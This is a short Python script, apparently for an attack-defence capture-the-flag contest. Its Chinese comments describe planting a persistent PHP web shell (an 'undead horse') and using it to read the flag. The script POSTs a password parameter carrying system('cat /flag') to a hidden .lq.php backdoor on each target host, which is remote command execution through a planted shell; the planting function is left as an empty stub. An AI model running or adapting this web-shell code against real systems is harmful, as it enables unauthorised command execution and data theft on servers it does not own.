#!/usr/bin/env python
# -*- coding=utf-8 -*-
import requests

# 种不死马
def upload_undead():
    pass

# 利用不死马生成的小马获取flag
def undead(host, passwd):
    try:
        url = "http://"+host+"/.lq.php"

        payload=passwd+'=system(\'cat%20%2Fflag\')%3B'
        headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
        }

        response = requests.request("POST", url, headers=headers, data=payload)
        # 种不死马
        upload_undead()
        return response.text.strip()
    except Exception as why:
        return False
